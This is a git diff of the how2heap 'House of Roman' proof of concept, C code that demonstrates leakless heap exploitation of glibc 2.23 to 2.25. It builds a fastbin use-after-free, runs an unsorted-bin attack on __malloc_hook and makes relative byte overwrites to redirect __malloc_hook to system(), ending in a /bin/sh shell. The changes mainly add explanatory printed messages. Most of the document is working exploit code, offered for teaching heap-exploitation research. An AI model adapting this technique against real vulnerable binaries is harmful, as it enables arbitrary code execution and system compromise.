@@ -4,12 +4,15 @@
 #include <string.h>
 #include <malloc.h>
 
+
 char* shell = "/bin/sh\x00";
 
 /* 
-Technique was tested on GLibC 2.23, 2.24 via the glibc_build.sh script inside of how2heap. 2.25 runs system but has a corrupted pointer (to the shell) for some reason.
+Technique was tested on GLibC 2.23, 2.24 via the glibc_build.sh script inside of how2heap on Ubuntu 16.04. 2.25 was tested on Ubuntu 17.04.
 
 Compile: gcc -fPIE -pie house_of_roman.c -o house_of_roman
+
+POC written by Maxwell Dulin (Strikeout) 
 */
 
 // Use this in order to turn off printf buffering (messes with heap alignment)
@@ -55,33 +58,48 @@ int main(){
 	pointers via UAF or overflow of some kind. Additionally, good control 
 	over the allocations sizes and freeing is required for this technique.
 	*/
-	
+
+	char* introduction = "\nWelcome to the House of Roman\n\n"
+			     "This is a heap exploitation technique that is LEAKLESS.\n"
+			     "There are three stages to the attack: \n\n"
+			     "1. Point a fastbin chunk to __malloc_hook.\n"
+			     "2. Run the unsorted_bin attack on __malloc_hook.\n"
+			     "3. Relative overwrite on main_arena at __malloc_hook.\n\n"
+			     "All of the stuff mentioned above is done using two main concepts:\n"
+                             "relative overwrites and heap feng shui.\n\n"
+			     "However, this technique comes at a cost:\n"
+                             "12-bits of entropy need to be brute forced.\n"
+			     "That means this technique only work 1 out of every 4096 tries or 0.02%.\n"
+			     "**NOTE**: For the purpose of this exploit, we set the random values in order to make this consisient\n\n\n";
+	puts(introduction);	
 	init();
 
-	/*
 
+	/*	
 	Part 1: Fastbin Chunk points to __malloc_hook
 
-	Getting the main_arena in a fastbin chunk ordering is the first step. 
+	Getting the main_arena in a fastbin chunk ordering is the first step.
 	This requires a ton of heap feng shui in order to line this up properly. 
-	However, at a glance, it looks like the following: 
+	However, at a glance, it looks like the following:
 
-	First, we need to get a chunk that is in the fastbin with a pointer to 
-	a heap chunk in the fd.
-
-	Second, we point this chunk to a pointer to LibC (in another heap chunk).
+	First, we need to get a chunk that is in the fastbin with a pointer to
+	a heap chunk in the fd. 
+	Second, we point this chunk to a pointer to LibC (in another heap chunk). 
 	All of the setup below is in order to get the configuration mentioned 
-	above setup to perform the relative overwrites.
+	above setup to perform the relative overwrites. ";
+
 
 	Getting the pointer to libC can be done in two ways: 
 			- A split from a chunk in the small/large/unsorted_bins 
 				gets allocated to a size of 0x70. 
 			- Overwrite the size of a small/large chunk used previously to 0x71.
 
-
 	For the sake of example, this uses the first option because it 
 	requires less vulnerabilities.	
 	*/
+
+	puts("Step 1: Point fastbin chunk to __malloc_hook\n\n");
+	puts("Setting up chunks for relative overwrites with heap feng shui.\n");
 
 	// Use this as the UAF chunk later to edit the heap pointer later to point to the LibC value.	
 	uint8_t* fastbin_victim = malloc(0x60); 
@@ -115,22 +133,19 @@ int main(){
 	 a security check (within malloc) that the size of the chunk matches the fastbin size.
 	*/
 
-	//Offset 0x100. Has main_arena + 0x68 in fd and bk.
+	puts("Allocate chunk that has a pointer to LibC main_arena inside of fd ptr.\n");
+//Offset 0x100. Has main_arena + 0x68 in fd and bk.
 	uint8_t* fake_libc_chunk = malloc(0x60);
-
-	printf("Location of fastbin_victim: 0x%p\n", fake_libc_chunk);
-	printf("Original fd of ptr: %lx\n", ((long*)fake_libc_chunk)[0]);
 
 	//// NOTE: This is NOT part of the exploit... \\\
 	// The __malloc_hook is calculated in order for the offsets to be found so that this exploit works on a handful of versions of GLibC. 
 	long long __malloc_hook = ((long*)fake_libc_chunk)[0] - 0xe8;
-	printf("__malloc_hook = 0x%llx\n", __malloc_hook);
+
 
 	// We need the filler because the overwrite below needs 
 	// to have a ptr in the fd slot in order to work. 
 	//Freeing this chunk puts a chunk in the fd slot of 'fastbin_victim' to be used later. 
-	free(relative_offset_heap);
-	
+	free(relative_offset_heap);	
 
     	/* 
     	Create a UAF on the chunk. Recall that the chunk that fastbin_victim 
@@ -175,9 +190,15 @@ int main(){
 	
 	*/
 
+
+	puts("\
+Overwrite the first byte of a heap chunk in order to point the fastbin chunk\n\
+to the chunk with the LibC address\n");
+	puts("\
+Fastbin 0x70 now looks like this:\n\
+heap_addr -> heap_addr2 -> LibC_main_arena\n");
 	fastbin_victim[0] = 0x00; // The location of this is at 0x100. But, we only want to overwrite the first byte. So, we put 0x0 for this.
 	
-	printf("fd of corrupted fastbin_victim: %lx\n", ((long *) fastbin_victim)[0]);
 
 	/*
 	Now, we have a fastbin that looks like the following: 
@@ -217,6 +238,10 @@ int main(){
 	to a version and some of the bits would have to be brute forced 
 	(depending on the bits).
 	*/ 
+
+puts("\
+Use a relative overwrite on the main_arena pointer in the fastbin.\n\
+Point this close to __malloc_hook in order to create a fake fastbin chunk\n");
 	long long __malloc_hook_adjust = __malloc_hook - 0x23; // We substract 0x23 from the malloc because we want to use a 0x7f as a valid fastbin chunk size.
 
 	// The relative overwrite
@@ -224,22 +249,23 @@ int main(){
 	int8_t byte2 = (__malloc_hook_adjust & 0xff00) >> 8; 
 	fake_libc_chunk[0] = byte1; // Least significant bytes of the address.
 	fake_libc_chunk[1] = byte2; // The upper most 4 bits of this must be brute forced in a real attack.
-	printf("Overwritten of fake_libc_chunk %lx\n", ((long*)fake_libc_chunk)[0]);
 
 	// Two filler chunks prior to the __malloc_hook chunk in the fastbin. 
 	// These are fastbin_victim and fake_libc_chunk.
+	puts("Get the fake chunk pointing close to __malloc_hook\n");
+	puts("\
+In a real exploit, this would fail 15/16 times\n\
+because of the final half byet of the malloc_hook being random\n");	
 	malloc(0x60);
 	malloc(0x60);
-
 
 	// If the 4 bit brute force did not work, this will crash because 
 	// of the chunk size not matching the bin for the chunk. 
 	// Otherwise, the next step of the attack can begin.
 	uint8_t* malloc_hook_chunk = malloc(0x60);	
-	printf("Malloc_hook chunk: %p\n", malloc_hook_chunk);
 
-	printf("Passed step 1\n");
-	
+	puts("Passed step 1 =)\n\n\n");
+
 	/*
 	Part 2: Unsorted_bin attack 
 
@@ -271,12 +297,21 @@ int main(){
 	The steps for phase two of the attack are explained as we go below.
 	*/
 
+	puts("\
+Start Step 2: Unsorted_bin attack\n\n\
+The unsorted bin attack gives us the ability to write a\n\
+large value to ANY location. But, we do not control the value\n\
+This value is always main_arena + 0x68. \n\
+We point the unsorted_bin attack to __malloc_hook for a \n\
+relative overwrite later.\n");
+
 
 	// Get the chunk to corrupt. Add another ptr in order to prevent consolidation upon freeing.
 	
 	uint8_t* unsorted_bin_ptr = malloc(0x80);	
 	malloc(0x30); // Don't want to consolidate
 
+	puts("Put chunk into unsorted_bin\n");
 	// Free the chunk to create the UAF
 	free(unsorted_bin_ptr);
 
@@ -287,9 +322,11 @@ int main(){
 	byte1 = (__malloc_hook_adjust) & 0xff; 	
 	byte2 = (__malloc_hook_adjust & 0xff00) >> 8; 
 
+
 	// Use another relative offset to overwrite the ptr of the chunk->bk pointer.
 	// From the previous brute force (4 bits from before) we 
 	// know where the location of this is at. It is 5 bytes away from __malloc_hook.
+	puts("Overwrite last two bytes of the chunk to point to __malloc_hook\n");
 	unsorted_bin_ptr[8] = byte1; // Byte 0 of bk. 	
 
 	// //// NOTE: Normally, the second half of the byte would HAVE to be brute forced. However, for the sake of example, we set this in order to make the exploit consistent. ///
@@ -313,11 +350,12 @@ int main(){
 
 	*/
 
+	puts("Trigger the unsorted_bin attack\n");
 	malloc(0x80); // Trigger the unsorted_bin attack to overwrite __malloc_hook with main_arena + 0x68
 
 	long long system_addr = (long long)system;
-	printf("Address of System: %p\n", &system);
 
+	puts("Passed step 2 =)\n\n\n");
 	/* 
 	Step 3: Set __malloc_hook to system
 	
@@ -330,19 +368,26 @@ int main(){
 
 	/// NOTE: For the sake of example, we will be setting these values, instead of brute forcing them. \\\
 	*/ 
+
+	puts("Step 3: Set __malloc_hook to system/one_gadget\n\n");
+	puts("\
+Now that we have a pointer to LibC inside of __malloc_hook (from step 2), \n\
+we can use a relative overwrite to point this to system or a one_gadget.\n\
+Note: In a real attack, this would be where the last 8 bits of brute forcing\n\
+comes from.\n");
 	malloc_hook_chunk[19] = system_addr & 0xff; // The first 12 bits are static (per version).
 
 	malloc_hook_chunk[20] = (system_addr >> 8) & 0xff;  // The last 4 bits of this must be brute forced (done previously already).
 	malloc_hook_chunk[21] = (system_addr >> 16) & 0xff;  // The last byte is the remaining 8 bits that must be brute forced.
 	malloc_hook_chunk[22] = (system_addr >> 24) & 0xff; // If the gap is between the data and text section is super wide, this is also needed. Just putting this in to be safe.
 
+
 	// Trigger the malloc call for code execution via the system call being ran from the __malloc_hook.
 	// In a real example, you would probably want to use a one_gadget. 
 	// But, to keep things portable, we will just use system and add a pointer to /bin/sh as the parameter
-
-	// Have the size be a pointer to /bin/sh in order to pop a shell within malloc.
 	// Although this is kind of cheating (the binary is PIE), if the binary was not PIE having a pointer into the .bss section would work without a single leak. 
 	// To get the system address (eariler on for consistency), the binary must be PIE though. So, the address is put in here.
+	puts("Pop Shell!");
 	malloc((long long)shell);
 		
 }
